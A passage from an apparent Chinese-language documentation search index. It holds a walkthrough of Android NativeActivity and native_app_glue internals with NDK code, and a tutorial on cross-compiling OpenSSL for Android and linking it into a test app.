pApplication)\u7684\u51fd\u6570\uff0c\u56e0\u6b64\uff0c\u6211\u4eecc++\u8fd9\u8fb9\u7684\u5165\u53e3\u51fd\u6570\u5c31\u662fandroid_main()\u6211\u4eec\u5728\u8fd9\u4e2aandroid_main()\u51fd\u6570\u91cc\u9762\u7684\u4efb\u52a1\u5c31\u662f\u8fdb\u884c\u6d88\u606f\u5faa\u73af\uff0c\u505a\u5404\u79cd\u4efb\u52a1\u3002 \u5728AndroidManifest.xml\u6587\u4ef6\u91cc\u9762\u6307\u5b9a\u5165\u53e3activity\u4e3anativeactivity, \u8fd9\u6837\u5e94\u7528\u7a0b\u5e8f\u4e00\u542f\u52a8\uff0cjava\u865a\u62df\u673a\u8fd9\u8fb9\u5c31\u5f00\u4e00\u4e2a\u4e3b\u7ebf\u7a0b\uff0c\u4e3b\u7ebf\u7a0b\u521b\u5efa\u4e00\u4e2a\u6d3b\u52a8\uff0c\u5c31\u662fnativeactivity\uff0c \u8fd9\u4e2anativeactivity\u5728\u521b\u5efa\u7684\u8fc7\u7a0b\u4e2d\u5c31\u4f1a\u53bb\u5e94\u7528\u7a0b\u5e8f\u7684.so\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u5bfb\u627e\u4e00\u4e2a\u51fd\u6570\uff1a __ANativeActivity_onCreate(ANativeActivity, void* size_t) \uff0c\u7136\u540e\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5c31\u662fC++\u4ee3\u7801\u4e2d\u7684\u771f\u6b63\u7684\u5165\u53e3\u51fd\u6570\uff0c\u5728\u8fd9\u4e2a\u5165\u53e3\u51fd\u6570\u91cc\u9762 \u505a\u5199\u4ec0\u4e48\u4e8b\u60c5\u5462\uff0c\u8bf7\u53c2\u8003ndk\u91cc\u9762\u7684Native_app_glue\u3002\u5b83\u662f\u8fd9\u6837\u6765\u5b9e\u73b0\u7684\uff1a \u5bf9\u8fd9\u4e2a\u4f20\u8fdb\u6765\u7684ANativeActivity, \u8bbe\u7f6e\u8fd9\u4e2aactivity\u7684\u5404\u79cd\u662f\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\uff1a activity->callbacks->onDestroy = onDestroy; activity->callbacks->onStart = onStart; \u8bbe\u7f6e\u5b8c\u4e86\u4e4b\u540e\u5c31\u8c03\u7528\uff1a activity->instance = android_app_create(activity, savedState, savedStateSize); \u8fc7\u7a0b\u5c31\u8fd9\u4e48\u7b80\u5355\uff0c\u5b8c\u4e86\uff0c\u73b0\u5728\u5206\u6790\u4e0bandroid_app_create\u8fd9\u4e2a\u51fd\u6570\uff1a static struct android_app* android_app_create(ANativeActivity* activity, void* savedState, size_t savedStateSize) { //\u9996\u5148\u521b\u5efa\u4e00\u4e2aandroid_app\u7ed3\u6784\u4f53\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u53c2\u89c1android_native_app_glue.h struct android_app* android_app = (struct android_app*)malloc(sizeof(struct android_app)); memset(android_app, 0, sizeof(struct android_app)); android_app->activity = activity; //\u8bbe\u7f6eapp\u7684activity pthread_mutex_init(&android_app->mutex, NULL); //\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\u540c\u6b65\u5bf9\u8c61 mutex\u4e92\u65a5\u4f53\uff0c pthread_cond_init(&android_app->cond, NULL); //\u521b\u5efa\u4e00\u4e2a\u6761\u4ef6\u53d8\u91cf\u3002\u7528\u4e8e\u7ebf\u7a0b\u540c\u6b65 //\u68c0\u67e5\u770b\u770bandroid\u7cfb\u7edf\u4e4b\u524d\u662f\u5426\u5df2\u7ecf\u4e3a\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u4fdd\u5b58\u8fc7\u72b6\u6001\u3002\u6709\u7684\u8bdd\u76f4\u63a5\u6062\u590d\u5c31\u597d\u4e86\u3002 //\u8fd8\u6709\u6bd4\u8f83\u91cd\u8981\u7684\u4e00\u6761\u4fe1\u606f\uff0candroid\u5e94\u7528\u7a0b\u5e8f\u7684\u5c4f\u5e55\u65b9\u5411\u53d8\u5316\u7684\u8bdd\uff0cactivity\u4e5f\u8981\u4ece\u65b0\u5efa\u7acb\uff01\uff01\uff01\uff01\uff01 if (savedState != NULL) { android_app->savedState = malloc(savedStateSize); android_app->savedStateSize = savedStateSize; memcpy(android_app->savedState, savedState, savedStateSize); } //\u521b\u5efa\u4e24\u4e2a\u7ba1\u9053\u5bf9\u8c61\uff0c\u7528\u4e8e\u7ebf\u7a0b\u8bfb\u5199\u6d88\u606f\u65f6\u540c\u6b65\u3002 int msgpipe[2]; if (pipe(msgpipe)) { LOGE(\"could not create pipe: %s\", strerror(errno)); return NULL; } android_app->msgread = msgpipe[0]; android_app->msgwrite = msgpipe[1]; //\u521b\u5efa\u6211\u4eec\u7684\u7ebf\u7a0b\uff0c\u6211\u4eec\u7684\u4ee3\u7801\u5c31\u662f\u8fd0\u884c\u5728\u8fd9\u4e2a\u7ebf\u7a0b\u91cc\u9762\u7684\uff0c pthread_attr_t attr; pthread_attr_init(&attr); pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED); //\u8fd9\u91cc\u6307\u5b9a\u4e86\u7ebf\u7a0b\u5165\u53e3\u51fd\u6570\uff0c\u548c\u4e00\u4e2auserdata\u6570\u636e\u5c31\u662fandroid_app\u8fd9\u4e2a\u7ed3\u6784\u4f53\u3002 pthread_create(&android_app->thread, &attr, android_app_entry, android_app); //\u7b49\u5f85\u6211\u4eec\u7684\u7ebf\u7a0b\u542f\u52a8. pthread_mutex_lock(&android_app->mutex); //\u7b49\u5f85\u6211\u4eec\u7684\u7ebf\u7a0b\u542f\u52a8\uff0c while (!android_app->running) { pthread_cond_wait(&android_app->cond, &android_app->mutex); } pthread_mutex_unlock(&android_app->mutex); //\u6211\u4eec\u7684\u7ebf\u7a0b\u542f\u52a8\u5b8c\u4e86\u4e4b\u540e\uff0c\u8fd4\u56de\u8fd9\u4e2a\u7ed3\u6784\u4f53\u3002\u8fd9\u6837activity\u7684oncreate\u5c31\u5b8c\u6210\u4e86\u3002 //\u4e3b\u7ebf\u7a0b\u4e2d\u5269\u4e0b\u7684\u4ee3\u7801\u5c31\u5728\u505a\u5404\u79cd\u4e8b\u4ef6\u6d88\u606f\u7684\u8def\u7531\u3002 return android_app; } \u73b0\u5728\u6765\u770b\u770b\u6211\u4eec\u7684\u7ebf\u7a0b\u7684\u5165\u53e3\u51fd\u6570\uff1aandroid_app_entry, static void* android_app_entry(void* param) { //param\u662f\u4e0a\u9762\u7684\u51fd\u6570\u521b\u5efa\u7ebf\u7a0b\u7684\u65f6\u5019\u4f20\u8fdb\u6765\u7684\u3002 struct android_app* android_app = (struct android_app*)param; //\u521b\u5efa\u5e94\u7528\u7a0b\u5e8fconfig android_app->config = AConfiguration_new(); AConfiguration_fromAssetManager(android_app->config, android_app->activity->assetManager); //\u901a\u8fc7log\u6253\u5370\u5e94\u7528\u7684config print_cur_config(android_app); //\u4ece\u4e3b\u7ebf\u7a0b\u6293\u53d6\u6d88\u606f\u7528\u7684 android_app->cmdPollSource.id = LOOPER_ID_MAIN; android_app->cmdPollSource.app = android_app; android_app->cmdPollSource.process = process_cmd; //\u8bbe\u7f6e\u5904\u7406cmd\u7684\u4e00\u4e2a\u51fd\u6570\u3002 android_app->inputPollSource.id = LOOPER_ID_INPUT; android_app->inputPollSource.app = android_app; android_app->inputPollSource.process = process_input;//\u8f93\u5165\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\uff0c //\u521b\u5efa\u4e00\u4e2alooper\u6d88\u606f\u5faa\u73af\uff0c\u6293\u53d6\u6d88\u606f\u3002 ALooper* looper = ALooper_prepare(ALOOPER_PREPARE_ALLOW_NON_CALLBACKS); ALooper_addFd(looper, android_app->msgread, LOOPER_ID_MAIN, ALOOPER_EVENT_INPUT, NULL, &android_app->cmdPollSource); android_app->looper = looper; pthread_mutex_lock(&android_app->mutex); android_app->running = 1; //\u8fd9\u91cc\u8fd9\u4e48\u8bbe\u7f6eactivity\u7684oncreate\u51fd\u6570\u5c31\u4f1a\u9000\u51fa\u3002 pthread_cond_broadcast(&android_app->cond); pthread_mutex_unlock(&android_app->mutex); android_main(android_app); //\u8c03\u7528\u6211\u4eec\u7684\u4ee3\u7801\u7684\u5165\u53e3\u51fd\u6570\u3002\u5728\u6211\u4eec\u81ea\u5df1\u5b9e\u73b0\u7684\u7684\u8fd9\u4e2a\u5165\u53e3\u51fd\u6570\u91cc\u9762 //\u5728\u6d88\u606f\u5faa\u73af\u91cc\u9762\u4e0d\u65ad\u7684\u6293\u53d6\u6d88\u606f\u5904\u7406\uff0c\u6216\u505a\u5176\u4ed6\u4e8b\u60c5\uff0c\u76f4\u5230\u63a7\u5236\u9000\u51fa\uff0c\u7136\u540e //\u8fd9\u4e2a\u7ebf\u7a0b\u624d\u4f1a\u7ed3\u675f\u3002 android_app_destroy(android_app); //\u9500\u6bc1android_app\u9000\u51fa\u7ebf\u7a0b\u3002 return NULL; } \u5904\u7406cmd\u7684\u51fd\u6570\uff1a static void process_cmd(struct android_app* app, struct android_poll_source* source) { int8_t cmd = android_app_read_cmd(app); android_app_pre_exec_cmd(app, cmd); if (app->onAppCmd != NULL) app->onAppCmd(app, cmd); android_app_post_exec_cmd(app, cmd); } \u5904\u7406\u8f93\u5165\u7684\u51fd\u6570 static void process_input(struct android_app* app, struct android_poll_source* source) { AInputEvent* event = NULL; if (AInputQueue_getEvent(app->inputQueue, &event) >= 0) { LOGV(\"New input event: type=%d\\n\", AInputEvent_getType(event)); if (AInputQueue_preDispatchEvent(app->inputQueue, event)) { return; } int32_t handled = 0; if (app->onInputEvent != NULL) handled = app->onInputEvent(app, event);//\u8fd9\u91cc\u4ea4\u7ed9android_app\u7684onInputEvent //\u53bb\u5904\u7406\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u81ea\u5df1\u5199\u7684\u8f93\u5165\u5904\u7406\u51fd\u6570\u3002 AInputQueue_finishEvent(app->inputQueue, event, handled); } else { LOGE(\"Failure reading next input event: %s\\n\", strerror(errno)); } } typedef struct ANativeActivity { /** * \u6307\u5411\u4e00\u4e2a\u62e5\u6709\u5404\u79cd\u4e8b\u4ef6\u56de\u8c03\u51fd\u6570\u7684\u7ed3\u6784\u4f53\u6307\u9488\uff0conStart\uff0conResume\uff0conPause\uff0conStop\uff0conDestroy */ struct ANativeActivityCallbacks* callbacks; /** * The global handle on the process's Java VM. */ JavaVM* vm; /** * JNI context for the main thread of the app. Note that this field * can ONLY be used from the main thread of the process; that is, the * thread that calls into the ANativeActivityCallbacks. */ JNIEnv* env; /** * The NativeActivity object handle. * * IMPORTANT NOTE: This member is mis-named. It should really be named * 'activity' instead of 'clazz', since it's a reference to the * NativeActivity instance created by the system for you. * * We unfortunately cannot change this without breaking NDK * source-compatibility. */ jobject clazz; /** * Path to this application's internal data directory. */ const char* internalDataPath; /** * Path to this application's external (removable/mountable) data directory. */ const char* externalDataPath; /** * The platform's SDK version code. */ int32_t sdkVersion; /** * This is the native instance of the application. It is not used by * the framework, but can be set by the application to its own instance * state. */ void* instance; //\u8fd9\u4e2a\u7528\u4e8e\u6307\u5411android_app\u4e86\u3002 /** * Pointer to the Asset Manager instance for the application. The application * uses this to access binary assets bundled inside its own .apk file. */ AAssetManager* assetManager; } ANativeActivity; \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/ldpxxx/article/details/9253369","title":"NativeActivity\u539f\u7406"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/","text":"1. \u6982\u8ff0 openssl\u53ef\u4ee5\u7f16\u8bd1\u6210ARM\u4e0b\u9762\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\uff08\u52a8\u6001\u5e93\u6216\u8005\u9759\u6001\u5e93\uff09\uff0c\u65b9\u4fbfAPP\u4f7f\u7528\uff0cAPP\u5728\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u9700\u8981\u4f7f\u7528JNI\u6765\u8fdb\u884c\u8c03\u7528\u3002 \u5b98\u65b9WIKI\u6709\u5199\u5982\u4f55\u4e3aandroid\u7f16\u8bd1openssl\uff0c\u5730\u5740\u662f\uff1a https://wiki.openssl.org/index.php/Android \u56e0\u6b64\u4e5f\u662f\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\u5b9e\u73b0\u7684\u3002 \u7f16\u8bd1\u4e0d\u592a\u590d\u6742\uff0c\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b\uff1a \u4e0b\u8f7dNDK \u4e0b\u8f7dopenssl\u6e90\u7801\u548c\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u6240\u9700\u8981\u7684setenv-android.sh \u914d\u7f6e\u7f16\u8bd1\u53c2\u6570 \u7f16\u8bd1 2. \u51c6\u5907\u5de5\u4f5c 2.1 \u73af\u5883\u51c6\u5907 \u5b98\u65b9\u7ed9\u7684\u65b9\u6cd5\uff0c\u662flinux\u4e0b\u7684\uff0c\u56e0\u6b64\u8fd9\u91cc\u5efa\u8bae\u4f7f\u7528\u4e0b\u9762\u4e09\u79cd\u65b9\u5f0f\u6765\u5b9e\u73b0\u7f16\u8bd1\uff1a ubuntu\u7269\u7406\u673a\u6216\u8005\u865a\u62df\u673a windows\u4e0a\u4f7f\u7528docker\uff0c\u7136\u540e\u4f7f\u7528ubuntu/debian\u4e00\u7c7b\u7684image\u6765\u7f16\u8bd1(\u5efa\u8bae\u4f7f\u7528Android SDK/NDK\u4e00\u7c7b\u7684image\uff0c\u7701\u53bb\u73af\u5883\u90e8\u7f72\u7684\u9ebb\u70e6) windows 10\u4e0a\u9762\u4f7f\u7528WSL \u4e0a\u8ff0\u4e09\u79cd\u5176\u5b9e\u914d\u7f6e\u548c\u7f16\u8bd1\u8fc7\u7a0b\u90fd\u662f\u4e00\u81f4\u7684\uff0c\u53ea\u662f\u540e\u4e24\u8005\u65b9\u4fbf\u4f7f\u7528windows\u4e3a\u4e3b\u7684\u7528\u6237\u3002\u56e0\u6b64\u6211\u8fd9\u91cc\u7ed9\u51fa\u7684WSL\u4e0a\u7684\u914d\u7f6e\u548c\u7f16\u8bd1\u8fc7\u7a0b\uff08\u5b9e\u9645\u4e0a\u548c\u524d\u4e24\u79cd\u6ca1\u4ec0\u4e48\u533a\u522b\uff09\u3002 2.2 \u5b89\u88c5linux\u7248\u672c\u7684NDK \u7f16\u8bd1Openssl\u9700\u8981\u4f7f\u7528NDK\uff0c\u5148\u4e0b\u8f7dNDK\uff1a # \u5728D\u76d8\u4e0b\u5efa\u7acbNDK\u76ee\u5f55 mkdir /mnt/d/ndk cd /mnt/d/ndk wget https://dl.google.com/android/repository/android-ndk-r14b-linux-x86_64.zip \u4e0b\u8f7d\u8fd8\u662f\u633a\u5feb\u7684\uff0c\u4e0d\u9700\u8981\u7ffb\u5899\uff0c\u7f51\u901f\u6162\u7684\u670b\u53cb\u53ef\u4ee5\u4f7f\u7528\u8fc5\u96f7\u6765\u8fdb\u884c\u4e0b\u8f7d\u3002 # \u89e3\u538b unzip android-ndk-r14b-linux-x86_64.zip # \u5982\u679c\u63d0\u793aunzip\u4e3a\u65e0\u6548\u547d\u4ee4\uff0c\u53ef\u4ee5\u4f7f\u7528apt-get\u8fdb\u884c\u5b89\u88c5 sudo apt-get install unzip \u6ce8\u610f\uff1a\u8bf7\u52ff\u5728windows\u4e0b\u76f4\u63a5\u89e3\u538b\uff0c\u56e0\u4e3a\u5185\u90e8\u4f1a\u6709\u540c\u540d\u6587\u4ef6\uff08\u53ea\u662f\u5927\u5c0f\u5199\u4e0d\u540c\uff09\uff0c\u5f15\u53d1\u6587\u4ef6\u8986\u76d6 \u6700\u540e\uff1aNDK\u88ab\u89e3\u538b\u5728\uff1a D\u76d8\u7684NDK\u76ee\u5f55\u4e0b\uff0c\u4e5f\u5c31\u662f\uff1a/mnt/d/ndk/android-ndk-r14b 2.3 \u51c6\u5907openssl\u6e90\u7801 # \u4e0b\u8f7d\u6e90\u7801 cd /mnt/d wget https://www.openssl.org/source/openssl-1.1.0f.tar.gz # \u89e3\u538b\u6e90\u7801 tar -zxvf openssl-1.1.0f.tar.gz #\u62c9\u53d6setenv-android.sh\uff0c\u6211\u4eec\u9700\u8981\u8fd9\u4e2a\u811a\u672c\u6765\u7ed9\u6211\u4eec\u914d\u7f6e\u73af\u5883 cd /mnt/d/openssl-1.1.0f wget https://wiki.openssl.org/images/7/70/Setenv-android.sh # \u6ce8\u610f\u8fd9\u4e2a\u6587\u4ef6\u662f\u5927\u5199\u5f00\u5934\u7684\uff0c\u6211\u4eec\u7a0d\u5fae\u4fee\u6539\u4e00\u4e0b\u540d\u79f0\uff0c\u65b9\u4fbf\u4f7f\u7528 mv Setenv-android.sh setenv-android.sh \u6700\u540e\uff0copenssl\u7684\u6e90\u7801\u6240\u5728\u4f4d\u7f6e\u662f\uff1a/mnt/d/openssl-1.1.0f 3. \u914d\u7f6e\u73af\u5883 \u7528\u7f16\u8f91\u5668\u7f16\u8f91\uff08\u53ef\u4ee5\u4f7f\u7528windows\u4e0b\u7684\u7f16\u8f91\u5668\uff0c\u6211\u8fd9\u91cc\u4f7f\u7528 notepad++ \uff09 setenv-android.sh \uff0c \u4fee\u6539\u4ee5\u4e0b\u53c2\u6570\uff1a _ANDROID_NDK=\"android-ndk-r9\" # \u4fee\u6539\u4e3a\uff1a _ANDROID_NDK=\"android-ndk-r14b\" # \u56e0\u4e3a\u6211\u4eec\u4f7f\u7528\u7684\u662fR14B\u8fd9\u4e2a\u7248\u672c\u7684NDK _ANDROID_EABI=\"arm-linux-androideabi-4.8\" \u4fee\u6539\u4e3aGCC 4.9 _ANDROID_EABI=\"arm-linux-androideabi-4.9\" \u6ce8\u610f\uff0c\u8fd9\u4e2a\u811a\u672c\u5728WSL\u4e0a\u6267\u884c\u53ef\u80fd\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u6211\u4e0b\u8f7d\u4e0b\u6765\u7684\u662f\\r\\n\u6362\u884c\u7684\uff0c\u5728WSL\u4e0a\u6267\u884c\u4f1a\u62a5\u9519\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528notepad++\u6765\u66ff\u6362\u6389\\r\uff0c\u5177\u4f53\u505a\u6cd5\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u66ff\u6362\u6389\\r 4. \u5f00\u59cb\u7f16\u8bd1 \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf \u6211\u4eec\u9700\u8981\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u6765\u6307\u5b9aNDK\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u6309\u7167\u4e4b\u524d\u7684\u5b89\u88c5\u4f4d\u7f6e\uff0c\u6211\u4eec\u53ea\u9700\u8981\u6267\u884c\uff1a export ANDROID_NDK_ROOT=/mnt/d/ndk/android-ndk-r14b source ./setenv-android.sh # \u8f93\u51fa ANDROID_NDK_ROOT: /mnt/d/ndk/android-ndk-r14b ANDROID_ARCH: arch-arm ANDROID_EABI: arm-linux-androideabi-4.9 ANDROID_API: android-18 ANDROID_SYSROOT: /mnt/d/ndk/android-ndk-r14b/platforms/android-18/arch-arm ANDROID_TOOLCHAIN: /mnt/d/ndk/android-ndk-r14b/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/bin FIPS_SIG: /mnt/d/openssl-1.1.0f/util/incore CROSS_COMPILE: arm-linux-androideabi- ANDROID_DEV: /mnt/d/ndk/android-ndk-r14b/platforms/android-18/arch-arm/usr \u6ce8\u610f\uff0c\u8fd9\u4e00\u6b65\u4e4b\u540e\uff0c\u8bf7\u52ff\u5173\u95edcmd/\u7ec8\u7aef\u7a97\u53e3\uff0c\u56e0\u4e3a\u7f16\u8bd1\u5668\u7b49\u53c2\u6570\u662f\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u4f20\u9012\u7ed9make\u7684 \u521b\u5efa\u8f93\u51fa\u76ee\u5f55 mkdir /mnt/d/openssl-output \u914d\u7f6e\u548c\u7f16\u8bd1 # \u914d\u7f6eopenssl ./config no-shared no-ssl2 no-ssl3 no-comp no-hw no-engine \\ --openssldir=/mnt/d/openssl-output/$ANDROID_API --prefix=/mnt/d/openssl-output/$ANDROID_API #\u7f16\u8bd1 make depend make all -j8 # -j8 \u8868\u793a\u5e76\u53d1\u7684\u7f16\u8bd1\"\u7ebf\u7a0b\u6570\"\uff0c\u5efa\u8bae\u8bbe\u7f6e\u6210CPU\u7ebf\u7a0b\u6570\u4e00\u81f4 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cno-shared\u8868\u793a\u4e0d\u7f16\u8bd1\u52a8\u6001\u5e93\uff0c\u8fd9\u6837\u7f16\u8bd1\u51fa\u6765\u7684openssl\u547d\u4ee4\uff0c\u4e0d\u4f9d\u8d56\u52a8\u6001\u5e93\uff0c\u540c\u65f6\u4e5f\u6ca1\u6709so\u4ea7\u751f\u3002\u66f4\u591a\u7684\u7f16\u8bd1\u53c2\u6570\uff0c\u8be6\u89c1\u6e90\u7801\u76ee\u5f55\u4e0b\u7684\uff1aINSTALL\uff08\u8be5\u6587\u4ef6\u6ca1\u6709\u540e\u7f00\uff09 \u5b89\u88c5 make install \u6267\u884c\u5b8c\u4e0a\u9762\u7684\u547d\u4ee4\uff0copenssl\u7684\u5934\u6587\u4ef6\u3001\u5e93\u6587\u4ef6\u3001\u6587\u6863\u4ee5\u53ca\u547d\u4ee4\u5c31\u88ab\u590d\u5236\u5728\uff1a /mnt/d/openssl-output \u76ee\u5f55\u91cc\u4e86\u3002 \u76ee\u5f55\u4e3b\u8981\u7ed3\u6784\u662f\uff1a bin \u5b58\u653eopenssl\u547d\u4ee4 include \u5934\u6587\u4ef6 lib \u5e93\u6587\u4ef6 share \u6587\u6863\u4e00\u7c7b\u7684 5. \u6d4b\u8bd5APP \u65b0\u5efa\u4e00\u4e2a\u6d4b\u8bd5APP\uff0c\u5e76\u52fe\u9009 include C++ support \u628ainclude\u4e0b\u7684openssl\u76ee\u5f55\uff0c\u6574\u4e2a\u590d\u5236\u5230\u9879\u76eesrc\u4e0b\u7684cpp\u5b50\u76ee\u5f55 \u628alib\u4e0b\u7684 libcrypto.a \u548c libssl.a \u590d\u5236\u5230src->cpp->libs\u5b50\u76ee\u5f55 \u6700\u7ec8\u76ee\u5f55\u7ed3\u6784\u5982\u4e0b\uff1a \u251c\u2500androidTest \u2502 \u2514\u2500java \u2502 \u2514\u2500com \u2502 \u2514\u2500example \u2502 \u2514\u2500summer \u2502 \u2514\u2500myapplication \u251c\u2500main \u2502 \u251c\u2500cpp \u2502 \u2502 \u251c\u2500libs \u2502 \u2502 \u2514\u2500openssl \u2502 \u251c\u2500java \u2502 \u2502 \u2514\u2500com \u2502 \u2502 \u2514\u2500example \u2502 \u2502 \u2514\u2500summer \u4fee\u6539CMakeLists.txt\uff0c\u5728 cmake_minimum_required(VERSION 3.4.1) \u540e\u9762\u52a0\uff1a # \u8868\u793a\u628asrc/main/cpp\u52a0\u5165include\u76ee\u5f55\uff0c\u8fd9\u6837\u5728\u4ee3\u7801\u4e2d\uff0c\u4f7f\u7528\uff1a#include <...>\u5c31\u80fd\u8bbf\u95ee\u5230\u5934\u6587\u4ef6 include_directories(src/main/cpp) # \u6dfb\u52a0\u4e24\u4e2a\u9884\u7f16\u8bd1\u5e93 add_library(openssl-crypto STATIC IMPORTED) set_target_properties(openssl-crypto PROPERTIES IMPORTED_LOCATION ${CMAKE_SOURCE_DIR}/src/main/cpp/libs/libcrypto.a ) add_library(openssl-ssl STATIC IMPORTED) set_target_properties(openssl-ssl PROPERTIES IMPORTED_LOCATION ${CMAKE_SOURCE_DIR}/src/main/cpp/libs/libssl.a ) \u628a\u6700\u540e\u7684\uff1a target_link_libraries( # Specifies the target library. native-lib # Links the target library to the log library # included in the NDK. ${log-lib}) \u4fee\u6539\u6210\uff1a target_link_libraries( # Specifies the target library. native-lib # Links the target library to the log library # included in the NDK. ${log-lib} openssl-ssl openssl-crypto) \u4fee\u6539app\u76ee\u5f55\u4e0b\u7684\uff1abuild.gradle android { compileSdkVersion 25 buildToolsVersion \"26.0.0\" defaultConfig { applicationId \"com.example.summer.myapplication\" minSdkVersion 15 targetSdkVersion 25 versionCode 1 versionName \"1.0\" testInstrumentationRunner \"android.support.test.runner.AndroidJUnitRunner\" externalNativeBuild { cmake { cppFlags \"-std=c++11 -frtti -fexceptions\" // \u4e0b\u9762\u8fd9\u6837\u662f\u589e\u52a0\u7684 arguments \"-DANDROID_ABI=armeabi-v7a\" } } } buildTypes { release { minifyEnabled false proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro' } } externalNativeBuild { cmake { path \"CMakeLists.txt\" } } } \u5b9e\u9645\u4e0a\u589e\u52a0\u7684\u53ea\u662f\u4e00\u884c\u4ee3\u7801\uff1a arguments \"-DANDROID_ABI=armeabi-v7a\" \u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cgradle\u4f1a\u901a\u8fc7\u591a\u6b21\u8c03\u7528\uff0c\u901a\u8fc7\u4f20\u9012 ABI \u7c7b\u578b\u6765\u8ba9cmake\u4ea7\u751f\u5404\u4e2a ABI \u4e0b nija \u6784\u5efa\u811a\u672c\uff0c\u4ece\u800c\u7f16\u8bd1\u51fa\u5404\u4e2a ABI \u4e0b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u56e0\u4e3aopenssl\u9ed8\u8ba4\u7f16\u8bd1\u51fa\u6765\u7684\u53ea\u6709 armeabi-v7a \u7684\uff0c\u56e0\u6b64\u6211\u4eec\u7559\u4e0b\u8fd9\u4e2a ABI \u5c31\u884c\u4e86\u3002 \u4fee\u6539native-lib.cpp \u5728\u7b2c\u4e00\u884c\u589e\u52a0\uff1a #include \"openssl/crypto.h\" \u4e0b\u9762\u7684\u4ee3\u7801\u66ff\u6362\u4e00\u4e0b\uff1a std::string hello = \"Hello from C++\"; return env->NewStringUTF(hello.c_str()); \u66ff\u6362\u4e3a\uff1a return env->NewStringUTF(OpenSSL_version(OPENSSL_VERSION)); \u542f\u52a8APP \u7f16\u8bd1\u4e4b\u540e\uff0c\u5982\u65e0\u610f\u5916\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u624b\u673a\u4e0a\u8fd0\u884c\u4e86\uff0c\u4f1a\u5230\u770b\u4e3b\u754c\u9762\u4e0a\u8f93\u5165openssl\u7684\u7248\u672c\u4fe1\u606f\uff1a openssl test app 6. \u5176\u4ed6 \u7f16\u8bd1\u5668\u517c\u5bb9\u6027 \u7ec6\u5fc3\u7684\u670b\u53cb\u53ef\u80fd\u53d1\u73b0\u4e86\uff0c\u6211\u7f16\u8bd1\u7684\u65f6\u5019\u4f7f\u7528\u7684\u662fGCC 4.9\uff0c\u800cAPP\u5728\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u9ed8\u8ba4\u4f7f\u7528\u4e86CLANG\uff0c\u5728google\u7684\u6587\u6863\u91cc\uff0cGCC\u5df2\u7ecf\u662f\u4e0d\u63a8\u8350\u7684\u5de5\u5177\u94fe\u4e86\uff08\u8be6\u89c1\uff1a https://developer.android.com/ndk/guides/cmake.html \uff09 \uff0c \u81f3\u4e8e\u4e24\u8005\u7684ABI\u517c\u5bb9\u6027\uff0c\u6211\u4e5f\u6ca1\u53d1\u73b0\u4e00\u4e2a\u6bd4\u8f83\u6743\u5a01\u7684\u7b54\u6848\uff0c\u53ef\u4ee5\u770b\u770b\u8fd9\u7bc7\u8ba8\u8bba\uff1a https://stackoverflow.com/questions/20875924/can-clang-compile-code-with-gcc-compiled-a-libs \u9274\u4e8eC++\u7684\u590d\u6742\u6027\uff0c\u5efa\u8baeC++\u4e0d\u8981\u8fd9\u6837\u505a\u3002 \u53ef\u4ee5\u5728build.gradle\u91cc\u9762\u8bbe\u7f6e\u6210GCC\u7f16\u8bd1\uff0c\u8fd9\u6837\u5de5\u5177\u94fe\u5c31\u4e00\u81f4\u4e86\u3002 android\u7684abi \u76ee\u524d\u9ed8\u8ba4\u6784\u5efa\u51fa\u6765\u7684\u662farmea-v7a\u7684\uff0c\u57fa\u672c\u4e0a\u5927\u90e8\u5206CPU\u90fd\u662f\u8fd9\u4e2a\u7c7b\u578b\u4e86\u3002\u800c\u76ee\u524d\u8fd9\u4e2a\u811a\u672c\u4e0d\u80fd\u76f4\u63a5\u6784\u5efa\u51fa64\u4f4d\u7684arm64-v8a\uff0c\u6709\u9700\u8981\u7684\u670b\u53cb\uff0c\u53ef\u4ee5\u53c2\u8003\uff1a http://doc.qt.io/qt-5/opensslsupport.html \u3002 \u81f3\u4e8eX86\uff0c\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\uff1a setenv-android.sh \u91cc\u9762\u7684\uff1a _ANDROID_ARCH=arch-x86 \u6765\u5b9e\u73b0\u3002\u81f3\u4e8eMIPS\u76ee\u524d\u4e0d\u80fd\u76f4\u63a5\u7f16\u8bd1\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/b790c548e787","title":"OpenSSL\u5b9e\u8df5 